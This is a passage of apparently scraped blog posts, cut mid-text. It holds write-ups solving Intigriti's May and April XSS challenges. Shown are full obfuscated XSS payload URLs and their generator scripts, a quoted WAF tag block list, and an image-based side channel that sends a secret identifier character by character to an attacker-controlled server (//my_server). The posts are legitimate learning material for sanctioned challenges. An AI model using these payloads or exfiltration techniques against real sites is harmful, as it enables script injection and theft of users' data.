https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;e[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;e&#96;%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[13]%2b&#96;$&#123;e[0]&#125;&#96;[2]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;.&#96;%2b&#96;$&#123;e[0]&#125;&#96;[2]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e[0]&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96;+&#96; The code used to generate it is: const mapping = &#123; a: '`$&#123;0/0&#125;`[1]', b: '`$&#123;e&#125;`[2]', c: '`$&#123;e&#125;`[5]', d: '`$&#123;e[0]&#125;`[2]', e: '`e`', f: '`$&#123;e[0]&#125;`[4]', g: '`$&#123;e&#125;`[15]', i: '`$&#123;e[0]&#125;`[5]', j: '`$&#123;e&#125;`[3]', l: '`$&#123;e&#125;`[21]', m: '`$&#123;e&#125;`[23]', n: '`$&#123;e&#125;`[25]', o: '`$&#123;e&#125;`[1]', r: '`$&#123;e&#125;`[13]', s: '`$&#123;e&#125;`[18]', t: '`$&#123;e&#125;`[6]', u: '`$&#123;e[0]&#125;`[0]', \".\": '`.`' &#125; function getString(str) &#123; return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+') &#125; const some = getString('some') mapping['('] = '`$&#123;[][' + some + ']&#125;`[13]' mapping[')'] = '`$&#123;[][' + some + ']&#125;`[14]' const cons = getString('constructor') let strConstructor = '``['+ cons + ']' strConstructor = '`$&#123;' + strConstructor + '&#125;`' const strToString = `$&#123;mapping.t&#125;+$&#123;mapping.o&#125;+$&#123;strConstructor&#125;[9]+$&#123;mapping.t&#125;+$&#123;mapping.r&#125;+$&#123;mapping.i&#125;+$&#123;mapping.n&#125;+$&#123;mapping.g&#125;` mapping.v = '31[' + strToString + ']`36`' const ans = \"[][\" + getString('some') + \"][\"+ getString('constructor') + \"]`_$&#123;\" + getString('alert(document.domain)') + \"&#125;```\" console.log('length:', ans.length) console.log('======= Payload =======') console.log(ans) console.log('======= URL =======') console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\\+/g, '%2b')) Further ShorteningAfter submitting the above code to the platform, the author said that the shortest code he saw was 376 characters. I thought about it for a while and couldn’t come up with anything, then I had a sudden inspiration: “Let’s try the v method, regardless of the browser issue.” Let’s review the browser issue. The problem is that if we want to use the function to string method to get v, the results produced by Chrome and Firefox are different: []['some']+'' // Chrome \"function some() &#123; [native code] &#125;\" v: index 23 // Firefox \"function some() &#123; [native code] &#125;\" v: index 27 So the same payload cannot be applied to both web pages. Ignoring this issue, the resulting code is: length: 376 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Payload &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[13]+&#96;$&#123;e[0]&#125;&#96;[0]+&#96;$&#123;e&#125;&#96;[5]+&#96;$&#123;e&#125;&#96;[6]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;e&#96;+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[23]+&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[21]+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[13]+&#96;$&#123;e&#125;&#96;[25]+&#96;$&#123;0&#x2F;0&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;+&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]+&#96;$&#123;e&#125;&#96;[1]+&#96;$&#123;e&#125;&#96;[23]+&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96; &#96; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; URL &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; https:&#x2F;&#x2F;challenge-0521.intigriti.io&#x2F;captcha.php?c&#x3D;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;][&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[13]%2b&#96;$&#123;e[0]&#125;&#96;[0]%2b&#96;$&#123;e&#125;&#96;[5]%2b&#96;$&#123;e&#125;&#96;[6]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[13]]&#96;_$&#123;&#96;e&#96;%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[23]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[21]%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[13]%2b&#96;$&#123;e&#125;&#96;[25]%2b&#96;$&#123;0&#x2F;0&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;%2b&#96;$&#123;[][&#96;$&#123;e&#125;&#96;[18]%2b&#96;$&#123;e&#125;&#96;[1]%2b&#96;$&#123;e&#125;&#96;[23]%2b&#96;e&#96;]&#125;&#96;[14]&#125;&#96;&#96; &#96; It’s 376 characters long, almost 100 characters less than the previous one. The complete code used to generate it is: const mapping = &#123; a: '`$&#123;0/0&#125;`[1]', b: '`$&#123;e&#125;`[2]', c: '`$&#123;e&#125;`[5]', d: '`$&#123;e[0]&#125;`[2]', e: '`e`', f: '`$&#123;e[0]&#125;`[4]', g: '`$&#123;e&#125;`[15]', i: '`$&#123;e[0]&#125;`[5]', j: '`$&#123;e&#125;`[3]', l: '`$&#123;e&#125;`[21]', m: '`$&#123;e&#125;`[23]', n: '`$&#123;e&#125;`[25]', o: '`$&#123;e&#125;`[1]', r: '`$&#123;e&#125;`[13]', s: '`$&#123;e&#125;`[18]', t: '`$&#123;e&#125;`[6]', u: '`$&#123;e[0]&#125;`[0]', \".\": '`.`' &#125; function getString(str) &#123; return str.split('').map(c => mapping[c] || 'errorerror:' + c).join('+') &#125; const some = getString('some') mapping['('] = '`$&#123;[][' + some + ']&#125;`[13]' mapping[')'] = '`$&#123;[][' + some + ']&#125;`[14]' mapping.v = '`$&#123;[][' + getString('some') + ']&#125;`[23]' const ans = \"[][\" + getString('some') + \"][\"+ getString('constructor') + \"]`_$&#123;\" + getString('eval(name)') + \"&#125;```\" console.log('length:', ans.length) console.log('======= Payload =======') console.log(ans) console.log('======= URL =======') console.log('https://challenge-0521.intigriti.io/captcha.php?c=' + ans.replace(/\\+/g, '%2b')) Some people may not understand why eval(name) works. This is because window.name is a magical property. Basically, the name of the same page will be the same, so we just need to create a new HTML page, write JS inside it, and set window.name = &#39;alert(document.domain)&#39;. Then use location= to jump to the PHP side, where name will be what we just set. Yes, it also works across domains. Because the result I finally got was also 376 characters, the same as the author’s shortest payload, I asked and found out that it was actually the same. ConclusionFrom this challenge, we can learn some JS-related knowledge, such as: Combining specified characters under restrictions The rules for calling functions and parameters with backticks Dynamically creating functions with function constructors When will this knowledge be useful? For attackers, when you encounter a place with filtered characters, you can use these techniques to bypass the restrictions. For defenders, when filtering, you need to consider these bypass methods. If you know that they can be bypassed in this way, you can make the filter more precise. However, these are all afterthoughts. For me, solving these problems is just for fun, and I haven’t thought about how it will help in the future.","link":"/2021/06/07/en/xss-challenge-by-intigriti-writeup-may/"},{"title":"Solving Intigriti's 0421 XSS Challenge (Part 1)","text":"IntroductionOne day, while browsing the internet, I came across an XSS challenge: Intigriti’s 0421 XSS challenge - by @terjanq. Apart from the challenge itself being very attractive, what attracted me more was the author who created it. Many of the security-related resources I found online that were more focused on front-end were maintained or contributed to by this author, such as Tiny XSS Payloads or the eye-opening XS-Leaks Wiki. Intigriti seems to hold this kind of XSS challenge every month, and this was the hardest one they have ever held. The challenge lasted from 4&#x2F;19 to 4&#x2F;25, with a week to try, and only 15 people successfully solved it. In March, 45 people solved the challenge, and in February, 33 people did, so the number of people who solved it this time was indeed much less, indicating the difficulty of the challenge. I spent about five days on it, and every time I got stuck, I thought, “I should give up and wait for the answer.” But then, from time to time, new ideas would come up, and I would try again. Finally, on the last day before the deadline, I solved it before the time limit, and when I did, I clenched my fists and shouted, “Too awesome!” This article is about my experience in solving the challenge. I previously wrote an English version, but it was probably worse than an elementary school composition, so I decided to write a Chinese version to better express my thoughts. The title will have a “Part 1” because this article is about my solution, and the next article will be about the author’s solution, and the one after that will analyze other people’s solutions. But it seems that my blog is cursed to break the series of articles that haven’t been written yet, so I hope I can make it through this time. Challenge ContentThe challenge is here: https://challenge-0421.intigriti.io/ The goal is to successfully execute XSS on this website and execute alert(&#39;flag&#123;THIS_IS_THE_FLAG&#125;&#39;) to win. There are two web pages in this challenge. The first one is index.html, and I only captured the relevant code for the challenge below: &lt;iframe id=\"wafIframe\" src=\"./waf.html\" sandbox=\"allow-scripts\" style=\"display:none\">&lt;/iframe> &lt;script> const wafIframe = document.getElementById('wafIframe').contentWindow; const identifier = getIdentifier(); function getIdentifier() &#123; const buf = new Uint32Array(2); crypto.getRandomValues(buf); return buf[0].toString(36) + buf[1].toString(36) &#125; function htmlError(str, safe)&#123; const div = document.getElementById(\"error-content\"); const container = document.getElementById(\"error-container\"); container.style.display = \"block\"; if(safe) div.innerHTML = str; else div.innerText = str; window.setTimeout(function()&#123; div.innerHTML = \"\"; container.style.display = \"none\"; &#125;, 10000); &#125; function addError(str)&#123; wafIframe.postMessage(&#123; identifier, str &#125;, '*'); &#125; window.addEventListener('message', e => &#123; if(e.data.type === 'waf')&#123; if(identifier !== e.data.identifier) throw /nice try/ htmlError(e.data.str, e.data.safe) &#125; &#125;); window.onload = () => &#123; const error = (new URL(location)).searchParams.get('error'); if(error !== null) addError(error); &#125; &lt;/script> First, when the window loads, the content of error is taken from the URL’s query string, and then addError(error) is called. Then, the content is added with a randomly generated ID and sent to wafIframe using postMessage. After wafIframe finishes processing, it sends the result back using postMessage. First, it checks whether the identifier is the same. If it is, the verification is passed, and then it checks whether e.data.safe is true. If it is, it uses innerHTML to add e.data.str, otherwise it uses innerText. Next, let’s take a look at what the other page, waf.html, is doing: onmessage = e => &#123; const identifier = e.data.identifier; e.source.postMessage(&#123; type:'waf', identifier, str: e.data.str, safe: (new WAF()).isSafe(e.data.str) &#125;,'*'); &#125; function WAF() &#123; const forbidden_words = ['&lt;style', '&lt;iframe', '&lt;embed', '&lt;form', '&lt;input', '&lt;button', '&lt;svg', '&lt;script', '&lt;math', '&lt;base', '&lt;link', 'javascript:', 'data:']; const dangerous_operators = ['\"', \"'\", '`', '(', ')', '&#123;', '&#125;', '[', ']', '='] function decodeHTMLEntities(str) &#123; var ta = document.createElement('textarea'); ta.innerHTML = str; return ta.value; &#125; function onlyASCII(str)&#123; return str.replace(/[^\\x21-\\x7e]/g,''); &#125; function firstTag(str)&#123; return str.search(/&lt;[a-z]+/i) &#125; function firstOnHandler(str)&#123; return str.search(/on[a-z]&#123;3,&#125;/i) &#125; function firstEqual(str)&#123; return str.search(/=/); &#125; function hasDangerousOperators(str)&#123; return dangerous_operators.some(op=>str.includes(op)); &#125; function hasForbiddenWord(str)&#123; return forbidden_words.some(word=>str.search(new RegExp(word, 'gi'))!==-1); &#125; this.isSafe = function(str) &#123; let decoded = onlyASCII(decodeHTMLEntities(str)); const first_tag = firstTag(decoded); if(first_tag === -1) return true; decoded = decoded.slice(first_tag); if(hasForbiddenWord(decoded)) return false; const first_on_handler = firstOnHandler(decoded); if(first_on_handler === -1) return true; decoded = decoded.slice(first_on_handler) const first_equal = firstEqual(decoded); if(first_equal === -1) return true; decoded = decoded.slice(first_equal+1); if(hasDangerousOperators(decoded)) return false; return true; &#125; &#125; When it receives data from index, it goes through a series of verifications to see if the data is safe. The verifications are done in the following order: First, the sent data is decoded and only ASCII is allowed. Find the first HTML tag and filter out [&#39;&lt;style&#39;, &#39;&lt;iframe&#39;, &#39;&lt;embed&#39;, &#39;&lt;form&#39;, &#39;&lt;input&#39;, &#39;&lt;button&#39;, &#39;&lt;svg&#39;, &#39;&lt;script&#39;, &#39;&lt;math&#39;, &#39;&lt;base&#39;, &#39;&lt;link&#39;, &#39;javascript:&#39;, &#39;data:&#39;]. Find the first &#x3D; sign that appears after the onXXX handler. Cannot have the following characters: [&#39;&quot;&#39;, &quot;&#39;&quot;, &#39;``&#39;, &#39;(&#39;, &#39;)&#39;, &#39;&#123;&#39;, &#39;&#125;&#39;, &#39;[&#39;, &#39;]&#39;, &#39;=&#39;]. If all of the above are successful, it is safe and will be interpreted as innerHTML by index.html. Combining the above conditions, if I pass error=123, the screen will display 123. If I pass &lt;h1&gt;hello&lt;/h1&gt;, the screen will actually display a heading with the word “hello”, but if I pass &lt;script&gt;alert(1)&lt;/script&gt;, the screen will only display the text and will not execute it as HTML because safe is false. That’s basically the introduction to the challenge. I highly recommend that you try it out for yourself first, at least for an hour or two, before reading this article, as you will gain a lot more from it. Below is my train of thought in solving the challenge, and I will write it according to the timeline of my solution. First AttemptAs can be seen from the title, there are two ways to successfully execute XSS: Bypass the restrictions using various tricks and execute XSS directly on the page. Use window.open to open this page and then postMessage, forge messages and make safe true, so that any HTML can be inserted. At first, I thought about the first method because for the second method, you need to know what the identifier is, but since it is random, it is impossible. I thought it was a dead end. So the next step is to think about how to bypass the restrictions. From the filtered tags, I found that my favorite &lt;img&gt; was not filtered out, and the onXX event handler was only restricted in content and was not filtered out together, so you can use: &lt;img src=x onerror=123&gt; to execute JS. But the problem is that there are too many characters that cannot be used, () cannot be used, so functions cannot be called, and using backticks &#96; to call is not possible either. So how can we execute alert? I was stuck here for a long time, and finally went to Google: “js call function without parentheses” and found this article: js call function without parentheses, which mentioned many tricks that I had never thought of. For example, using the object’s valueOf with +, or using new with constructor, or the most amazing one is onerror&#x3D;eval with throw. These are all super cool techniques to bypass restrictions without using (). But none of the above worked because the restrictions were too strict. The object’s &#123;&#125; cannot be used, and new cannot be used because it requires a space. The reason why there cannot be a space is because &lt;img onerror=new abc&gt; will be interpreted as: &lt;img onerror=&quot;new&quot; abc&gt;. If you want them to be put together in onerror, you can only use &quot; to enclose them, but &quot; is a restricted character that cannot be used, so there cannot be spaces in onerror. Throw seemed to have a chance, but onerror=eval, which is a prerequisite for execution, has an equal sign, so it cannot be used. At this point, I thought, what if I HTML entity encode the restricted characters? Change = to &amp;#61; to bypass the restrictions. After trying it out, I found that it didn’t work because it had been restored to characters in the first step decodeHTMLEntities(str). At this point, I had two ideas: Can decoding HTML entities inside textarea cause XSS? Can double encoding be used? The first approach is not feasible because although there is ta.innerHTML = str;, this element has never been placed on the DOM, so it is useless. The second approach is also not feasible because the final &amp;#61; will only be treated as text to display. After trying for a long time, I couldn’t come up with anything. The only code that can be executed successfully is &lt;img src=x onerror=throw/0/+identifier&gt;, which throws the identifier as an error message and then nothing happens. But this can’t do anything. HintsFor every 100 likes received, a hint will be released. Due to the difficulty of the challenge, there are also additional hints. The hints I saw were: First hint: find the objective! (4&#x2F;19 21:57) Time for another hint! Where to smuggle data? (4&#x2F;20 00:24) Time for another tip! One bite after another! (4&#x2F;20 19:55) To be honest, I didn’t understand these hints very well. The one I understood the most was the third one, which should mean “One Byte after another”. Looking back at the XS-Leaks mentioned earlier, I thought, “Damn, could it be that the dead end I thought was the right solution?”. The dead end I mentioned earlier is “forging messages by postMessage from elsewhere”, but I need to know what the randomly generated identifier is to succeed. If this is the right approach, the process to be solved should be: Open a web page and use window.open to open the XSS challenge. Find a way to get the identifier. Post the message to yourself from this web page and insert any HTML. As long as the second step is successful, the whole process can be connected. But the problem is, how do I know what the identifier is? Since the hint says “one byte after another”, I guess it should leak out one character at a time, so I can start thinking from one character. At this point, I thought of this: &lt;img src=x onerror=identifier&lt;&#39;1&#39;?is_zero:keep_trying&gt;. We can use the ternary operator with &lt; to determine the first character of the identifier. Although we cannot use strings, &#39;1&#39; can be replaced with &lt;div id=n1&gt;1&lt;/div&gt; + n1.innerText to avoid single and double quotes. And the ternary operator can be nested indefinitely, like this: identifier&lt;'1'?is_zero: identifier&lt;'2'?is_one: identifier&lt;'3'?is_two: identifier&lt;'4'?is_three: .... So we can indeed use this method to find out what the first character of the identifier is. But the problem is, once we know it, how do we pass this information out? We cannot call functions, and we cannot even assign values. So how do we pass information out? If we could use =, we could change window.opener.location with something like window.opener.location = xxx+1, or use &lt;img id=a src=x&gt; with a.src=xxxx to load a new image, so that I can know from the server side what character was leaked. But because we cannot use the equal sign, we cannot do any of these things. At this point, I was stuck again, and for a long time. I couldn’t think of how to pass the information out. Then I got the next hint: Here’s an extra tip: ++ is also an assignment (4&#x2F;20 22:17) When I first saw this hint, I thought it might be useful, but I didn’t know how to use it. ++ can also change values, but what’s the use? I initially thought about going in the direction of window.opener, are there any properties that can be manipulated, such as window.opener.name++? Or are there any other properties that can be manipulated? If I could change a property of a window.opener, I could somehow pass the leaked information back. But I searched for a long time and even looked at the spec, and it seems that there is no such thing. window.opener.location can be changed, but ++ cannot be used, because ++ is like window.opener.location = window.opener.location + 1, and if executed, it will throw an error because it involves reading: VM82:1 Uncaught DOMException: Blocked a frame with origin &quot;https:&#x2F;&#x2F;challenge-0421.intigriti.io&quot; from accessing a cross-origin frame. Then I remembered a trick I learned somewhere, using image loading. For example, if you make an image not load, and then use ++ to change the CSS or other properties to make it load, then I can know this information from the server. I tried this: &lt;img id=n0 src=//server/n0 style=\"opacity:0;\"> &lt;img src=x onerror=identifier&lt;'1'?n0.style.opacity++:...> But the image would still load even if the opacity was 0, so it didn’t work. Later, I tried several other properties and remembered one I had used recently: loading. In the past, if you wanted to lazy load images, you would often use a plugin, and earlier you needed to detect scrolling, but recently you can use IntersectionObserver. And more recently, many browsers support native lazy loading: &lt;img src=x loding=&quot;lazy&quot;&gt;, and if the image is not too far from the visible area, it will not be loaded. So we can do this: &lt;div style=\"height: 9999px\">&lt;/div> &lt;img id=n0 src=//server/n0 loading=\"lazy\"> &lt;img src=x onerror=identifier&lt;'1'?n0.loading++:...> First, use a very high div to push the image down, outside the threshold, and then when we confirm that the first character is 0, we increase the loading of n0, which will become NaN after ++, and because loading does not have NaN as a value, it will fallback to the default auto and load the image. Assuming server/n0 is my own server, then I receive the n0 request, which means the first character is 0. With this idea, we can indeed know what the first character is, like this: &lt;div style=\"height: 9999px\">&lt;/div> &lt;img id=n0 src=//server/n0 loading=\"lazy\"> &lt;img id=n1 src=//server/n1 loading=\"lazy\"> &lt;img id=n2 src=//server/n2 loading=\"lazy\"> &lt;img src=x onerror= identifier&lt;'1'?n0.loading++: identifier&lt;'2'?n1.loading++: identifier&lt;'3'?n2.loading++: ...> We have the first character! But what about the second one? We cannot use identifier[1] because we cannot use brackets. I thought about all kinds of possibilities and felt that this was a dead end. It was impossible to get the nth character without using []()&#123;&#125;. Solving the weakened version?Although I felt that it was impossible to get the nth character and was stuck in the problem, I had a bold idea. I cannot get the nth character of a string, but what about a number? Can I get it through a series of mathematical operations? For example, to get 2 from 123, it would be something like 123&#x2F;10%10 (although it will come out as a decimal). Or directly using binary, num&amp;1 can tell you the last bit of num, num&amp;2 can tell you the second to last bit, and so on, so you can know what each bit is. However, the identifier is not a number, so what should we do? Find a way to convert it to a number! If the identifier only contains 0-9a-z, we can add 0x in front of it and convert it to a number using +. Finally, it will look like this: &lt;body> &lt;div style=height:9999px id=a>0x&lt;/div> &lt;img src=https://example.com/x00 id=x00 loading=lazy> &lt;img src=https://example.com/x01 id=x01 loading=lazy> &lt;img src=https://example.com/x10 id=x10 loading=lazy> &lt;img src=https://example.com/x11 id=x11 loading=lazy> &lt;img src=https://example.com/x20 id=x20 loading=lazy> &lt;img src=https://example.com/x21 id=x21 loading=lazy> &lt;img src=x onerror= a.innerText+identifier&amp;1?x01.loading++:x00.loading++; a.innerText+identifier&amp;2?x11.loading++:x10.loading++; a.innerText+identifier&amp;4?x21.loading++:x20.loading++ > &lt;/body> &lt;script> var identifier = 'a4' // 164 // 10100100 &lt;/script> Note that the operator’s priority must be considered. If the order is not as expected, it may not work properly. For example, +&#39;0x&#39;+identifier will execute +0x first, rather than concatenating the strings. The &amp; operator will try to convert to a number first, which is why it can be used in this way. The above POC proves that if we can convert the identifier to a number, we can solve this problem. However, the identifier may contain characters above f, and the probability of being able to convert it to a number is very low, less than 0.01%, and it takes an average of ten thousand attempts to succeed. Although this probability is unacceptable, at least I know that the weakened version can be solved. Relying on Hints AgainAfter solving the weakened version, I thought it was almost over. Maybe my direction was wrong, and it was not solved in this way? Because I really couldn’t figure out how to get identifier[n], I thought it was impossible. At this point, I saw a new hint: “Behind a Greater Oracle there stands one great Identity” (leak it) (4&#x2F;22 15:53) Tipping time! Goal &lt; object(ive) (4&#x2F;23 01:58) From these two new hints, it was verified that my direction was actually correct, that is, to leak the identifier, and then use the &lt; symbol to compare. So I should only be one or two steps away from solving it, and I’m almost there. But these last two steps are really difficult. Although I wanted to give up, after a day, I had a new idea: “I don’t really need to get the second character separately! Assuming I have a place to store the first character, then I only need identifier &lt; str + &#39;1&#39;, right?” If there is a place to store the found character, then a loop-like concept can be used to run and leak all the characters. Where would this place be? This place needs to be passed from the opener because only the opener knows what character is leaked now. But because of cross-origin issues, there is no attribute that can be accessed by the opener. After trying for about an hour or two, I suddenly thought of reversing it. Instead of getting something from the opener, the opener passes something to the open window. How to pass it? It can be done through location.hash! After opening the XSS challenge with window.open in our webpage, we can use win.location = url + &#39;#a&#39; to add a hash without reloading the webpage. After adding it, it can be accessed in the webpage using location.hash. Exchange information between cross-origin windows through location.hash. Although I took another step forward, there are still two problems that need to be solved: We need something like a loop We need to be able to send multiple requests to the server Starting with the first problem, we need to execute similar code continuously to leak one character at a time. This is not difficult. We can use this.src++ to change the src of the image. Once the src is assigned, even if the value is the same, the image will still be reloaded. For example: &lt;body> &lt;script> var count = 1 &lt;/script> &lt;img src=x onerror=count&lt;10?count++&amp;&amp;src++:console.log(count)> &lt;/body> There is no problem with the loop. Next is the part of leaking information multiple times. The lazy loading we used before can only be used once for an image because once the image is loaded, it is loaded, and there is no way to use img.loading++ to load it again. What should we do? We need a channel that allows us to send the correct request at the specified time. After trying randomly for a while, I found a magical attribute: srcset, which is magical when used with src. When I set src and srcset together, the browser will prioritize loading the URL of srcset. The magical thing is that when I increment src, srcset will be loaded again! Here is an example that loads x2 ten times: &lt;body> &lt;script> var count = 1 &lt;/script> &lt;img src=x1 srcset=x2 onerror=count&lt;10?count+++this.src++:123> &lt;/body> Since these two problems have been solved, putting them together can solve the final answer. The process is as follows: Open poc.html and window.open XSS challenge Error carries our prepared payload Use the onerror of the image to execute a nested ternary operator. If the condition is met, load the corresponding image, leak out the nth character, and wait for the next loop to start The server receives the image and knows what the nth character is The server passes the result to poc.html, and poc.html updates win.location.hash After the update, the server opens the next loop by returning a response, adding n+1, and returning to step 3 Repeat the above steps until the token is found The ideal process is as follows, but due to time constraints, I didn’t follow it strictly in some places, for example: I assumed that the first character of the identifier is 1, if not, skip it. The server waits for 500ms to start the next loop, but it is possible that the location.hash has not been updated yet. The ideal way for the server to send results to poc.html is to use WebSockets, but I took a shortcut and used long polling. I was too lazy to check if all the identifiers were fetched, so I started trying to use postMessage when the length was greater than 10. The final code looks like this: var payload = ` &lt;img srcset=//my_server/0 id=n0 alt=#> &lt;img srcset=//my_server/1 id=n1 alt=a> &lt;img srcset=//my_server/2 id=n2 alt=b> &lt;img srcset=//my_server/3 id=n3 alt=c> &lt;img srcset=//my_server/4 id=n4 alt=d> &lt;img srcset=//my_server/5 id=n5 alt=e> &lt;img srcset=//my_server/6 id=n6 alt=f> &lt;img srcset=//my_server/7 id=n7 alt=g> &lt;img srcset=//my_server/8 id=n8 alt=h> &lt;img srcset=//my_server/9 id=n9 alt=i> &lt;img srcset=//my_server/a id=n10 alt=j> &lt;img srcset=//my_server/b id=n11 alt=k> &lt;img srcset=//my_server/c id=n12 alt=l> &lt;img srcset=//my_server/d id=n13 alt=m> &lt;img srcset=//my_server/e id=n14 alt=n> &lt;img srcset=//my_server/f id=n15 alt=o> &lt;img srcset=//my_server/g id=n16 alt=p> &lt;img srcset=//my_server/h id=n17 alt=q> &lt;img srcset=//my_server/i id=n18 alt=r> &lt;img srcset=//my_server/j id=n19 alt=s> &lt;img srcset=//my_server/k id=n20 alt=t> &lt;img srcset=//my_server/l id=n21 alt=u> &lt;img srcset=//my_server/m id=n22 alt=v> &lt;img srcset=//my_server/n id=n23 alt=w> &lt;img srcset=//my_server/o id=n24 alt=x> &lt;img srcset=//my_server/p id=n25 alt=y> &lt;img srcset=//my_server/q id=n26 alt=z> &lt;img srcset=//my_server/r id=n27 alt=0> &lt;img srcset=//my_server/s id=n28> &lt;img srcset=//my_server/t id=n29> &lt;img srcset=//my_server/u id=n30> &lt;img srcset=//my_server/v id=n31> &lt;img srcset=//my_server/w id=n32> &lt;img srcset=//my_server/x id=n33> &lt;img srcset=//my_server/y id=n34> &lt;img srcset=//my_server/z id=n35> &lt;img id=lo srcset=//my_server/loop onerror= n0.alt+identifier&lt;location.hash+1?n0.src+++lo.src++: n0.alt+identifier&lt;location.hash+2?n1.src+++lo.src++: n0.alt+identifier&lt;location.hash+3?n2.src+++lo.src++: n0.alt+identifier&lt;location.hash+4?n3.src+++lo.src++: n0.alt+identifier&lt;location.hash+5?n4.src+++lo.src++: n0.alt+identifier&lt;location.hash+6?n5.src+++lo.src++: n0.alt+identifier&lt;location.hash+7?n6.src+++lo.src++: n0.alt+identifier&lt;location.hash+8?n7.src+++lo.src++: n0.alt+identifier&lt;location.hash+9?n8.src+++lo.src++: n0.alt+identifier&lt;location.hash+n1.alt?n9.src+++lo.src++: n0.alt+identifier&lt;location.hash+n2.alt?n10.src+++lo.src++: n0.alt+identifier&lt;location.hash+n3.alt?n11.src+++lo.src++: n0.alt+identifier&lt;location.hash+n4.alt?n12.src+++lo.src++: n0.alt+identifier&lt;location.hash+n5.alt?n13.src+++lo.src++: n0.alt+identifier&lt;location.hash+n6.alt?n14.src+++lo.src++: n0.alt+identifier&lt;location.hash+n7.alt?n15.src+++lo.src++: n0.alt+identifier&lt;location.hash+n8.alt?n16.src+++lo.src++: n0.alt+identifier&lt;location.hash+n9.alt?n17.src+++lo.src++: n0.alt+identifier&lt;location.hash+n10.alt?n18.src+++lo.src++: n0.alt+identifier&lt;location.hash+n11.alt?n19.src+++lo.src++: n0.alt+identifier&lt;location.hash+n12.alt?n20.src+++lo.src++: n0.alt+identifier&lt;location.hash+n13.alt?n21.src+++lo.src++: n0.alt+identifier&lt;location.hash+n14.alt?n22.src+++lo.src++: n0.alt+identifier&lt;location.hash+n15.alt?n23.src+++lo.src++: n0.alt+identifier&lt;location.hash+n16.alt?n24.src+++lo.src++: n0.alt+identifier&lt;location.hash+n17.alt?n25.src+++lo.src++: n0.alt+identifier&lt;location.hash+n18.alt?n26.src+++lo.src++: n0.alt+identifier&lt;location.hash+n19.alt?n27.src+++lo.src++: 